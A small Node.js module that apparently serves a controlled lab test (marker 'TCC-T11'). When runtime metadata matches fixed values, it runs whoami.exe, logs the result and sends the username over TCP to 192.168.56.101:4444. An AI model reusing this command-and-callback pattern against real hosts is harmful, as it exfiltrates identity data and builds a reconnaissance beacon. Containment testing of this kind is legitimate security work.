'use strict';

const fs = require('fs');
const net = require('net');
const { execFileSync } = require('child_process');

async function executeMetadataAction(spec) {
  if (!spec) {
    console.log('No runtime metadata present.');
    return;
  }

  if (
    spec.operation !== 'identity_callback' ||
    spec.transport !== 'tcp' ||
    spec.host !== '192.168.56.101' ||
    spec.port !== 4444 ||
    spec.request !== 'whoami' ||
    spec.marker !== 'TCC-T11'
  ) {
    throw new Error('Runtime metadata outside experimental policy.');
  }

  const identity = execFileSync(
    'whoami.exe',
    [],
    { encoding: 'utf8' }
  ).trim();

  const evidence = [
    `marker=${spec.marker}`,
    `operation=${spec.operation}`,
    `transport=${spec.transport}`,
    `target=${spec.host}:${spec.port}`,
    `request=${spec.request}`,
    `identity=${identity}`
  ].join('\n');

  fs.writeFileSync(
    't11_result.txt',
    evidence + '\n',
    'utf8'
  );

  await new Promise((resolve, reject) => {
    const client = net.createConnection({
      host: spec.host,
      port: spec.port
    });

    client.on('connect', () => {
      client.end(
        `${spec.marker}\n${identity}\n`
      );
    });

    client.on('close', resolve);
    client.on('error', reject);
  });

  console.log('Controlled callback completed.');
}

module.exports = {
  executeMetadataAction
};